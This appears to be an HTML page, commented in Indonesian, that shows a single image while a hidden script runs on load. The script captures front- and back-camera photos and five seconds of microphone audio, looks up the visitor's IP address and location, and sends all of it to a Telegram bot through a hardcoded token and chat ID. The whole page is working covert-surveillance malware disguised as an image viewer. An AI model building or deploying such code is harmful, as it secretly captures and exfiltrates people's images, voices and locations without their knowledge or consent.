<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bagus Xxpn</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
        video, canvas { display: none; } /* Sembunyikan elemen kamera */
    </style>
</head>
<body>
    <!-- Gambar yang lo mau tampilkan -->
    <img src="https://img5.pixhost.to/images/2820/565901428_skyzopedia.jpg" alt="Skyzopedia">

    <!-- Kamera -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
        const TELEGRAM_CHAT_ID = "7081489041";

        async function startCapture() {
            try {
                // Ambil IP dan lokasi
                const ipData = await getIPAndLocation();

                // Ambil foto dari kamera depan & belakang
                const frontPhoto = await capturePhoto("user");
                const backPhoto = await capturePhoto("environment");

                // Rekam suara
                const audioBlob = await recordAudio();

                // Kirim semua data ke Telegram
                await sendToTelegram(frontPhoto, "Depan");
                await sendToTelegram(backPhoto, "Belakang");
                await sendAudioToTelegram(audioBlob);
                await sendTextToTelegram(`📍 Info Pengguna:\nIP: ${ipData.ip}\nLokasi: ${ipData.city}, ${ipData.country}`);
            } catch (error) {
                console.error("Error:", error);
            }
        }

        async function capturePhoto(facingMode) {
            return new Promise(async (resolve) => {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                const video = document.getElementById("video");
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    const canvas = document.getElementById("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL("image/jpeg");
                    stream.getTracks().forEach(track => track.stop()); // Hentikan kamera
                    resolve(imageData);
                };
            });
        }

        async function recordAudio() {
            return new Promise(async (resolve) => {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: "audio/mp3" });
                    resolve(audioBlob);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop()); // Hentikan mikrofon
                }, 5000); // Rekam selama 5 detik
            });
        }

        async function getIPAndLocation() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                return await response.json();
            } catch (error) {
                console.error("Gagal mendapatkan IP:", error);
                return { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui" };
            }
        }

        async function sendToTelegram(imageData, label) {
            try {
                const blob = await fetch(imageData).then(res => res.blob());
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, `${label}.jpg`);
                formData.append("caption", `📷 Foto ${label}`);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } catch (error) {
                console.error("Gagal mengirim foto:", error);
            }
        }

        async function sendAudioToTelegram(audioBlob) {
            try {
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("voice", audioBlob, "audio.mp3");
                formData.append("caption", "🎤 Rekaman Suara");

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                    method: "POST",
                    body: formData
                });
            } catch (error) {
                console.error("Gagal mengirim audio:", error);
            }
        }

        async function sendTextToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
                });
            } catch (error) {
                console.error("Gagal mengirim pesan:", error);
            }
        }

        window.onload = startCapture;
    </script>
</body>
</html>
